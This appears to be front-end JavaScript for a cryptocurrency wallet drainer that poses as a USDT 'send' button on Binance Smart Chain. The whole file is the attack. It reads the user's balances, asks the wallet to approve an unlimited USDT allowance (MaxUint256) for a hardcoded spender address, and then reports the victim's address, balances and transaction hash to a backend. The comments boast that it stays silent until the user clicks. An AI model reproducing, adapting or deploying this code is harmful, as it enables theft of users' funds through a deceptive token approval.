let provider;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== NO AUTO-CONNECT - COMPLETELY SILENT =====
// Wallet will only be accessed when user clicks Send button
// This prevents any connection popup on page load

// ===== ENSURE BSC NETWORK =====
async function ensureBSC() {
  try {
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    const currentChainId = parseInt(chainId, 16); // Convert hex to decimal
    
    if (currentChainId !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: `0x${BSC_CHAIN_ID.toString(16)}` }] // Convert to hex
      });
    }
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: `0x${BSC_CHAIN_ID.toString(16)}`, // Convert to hex
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Wallet not found");
      return;
    }

    // Step 1: Setup provider (no wallet interaction yet)
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }

    // Step 2: Check network BEFORE accessing wallet (no popup)
    const network = await provider.getNetwork();
    if (Number(network.chainId) !== BSC_CHAIN_ID) {
      await ensureBSC();
    }

    // Step 3: Get signer ONLY when making transaction (Trust Wallet handles this seamlessly)
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // Create contract with signer
    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(userAddress);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(userAddress);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // This transaction call will trigger Trust Wallet approval popup
    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React (if available)
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: userAddress,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
